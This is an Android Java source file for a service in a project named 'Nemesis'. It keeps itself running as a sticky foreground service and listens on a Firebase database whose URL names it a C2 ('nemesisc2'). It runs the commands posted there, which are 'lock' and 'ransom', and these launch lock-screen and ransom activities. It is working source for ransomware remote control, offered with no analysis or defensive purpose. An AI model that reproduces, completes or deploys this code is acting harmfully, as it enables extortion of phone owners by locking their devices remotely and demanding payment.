package com.nemesis;

import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import androidx.core.app.NotificationCompat;
import com.google.firebase.database.*;

public class FirebaseService extends Service {

    private static final String CHANNEL_ID = "NemesisChannel";

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        startForeground(1, new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Nemesis")
                .setContentText("Running")
                .setSmallIcon(android.R.drawable.ic_lock_lock)
                .build());

        listenCommands();
    }

    private void listenCommands() {
        String url = "https://nemesisc2-default-rtdb.firebaseio.com/";
        DatabaseReference ref = FirebaseDatabase.getInstance(url).getReference("commands");

        ref.addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(DataSnapshot snapshot) {
                for (DataSnapshot child : snapshot.getChildren()) {
                    String command = child.getValue(String.class);
                    if (command != null) {
                        executeCommand(command);
                        child.getRef().removeValue();
                    }
                }
            }
            @Override
            public void onCancelled(DatabaseError error) {}
        });
    }

    private void executeCommand(String command) {
        if (command.equals("lock")) {
            Intent lock = new Intent(this, LockscreenActivity.class);
            lock.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(lock);
        } else if (command.equals("ransom")) {
            Intent ransom = new Intent(this, RansomActivity.class);
            ransom.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(ransom);
        }
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "Nemesis Service",
                    NotificationManager.IMPORTANCE_LOW
            );
            getSystemService(NotificationManager.class).createNotificationChannel(channel);
        }
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }
}
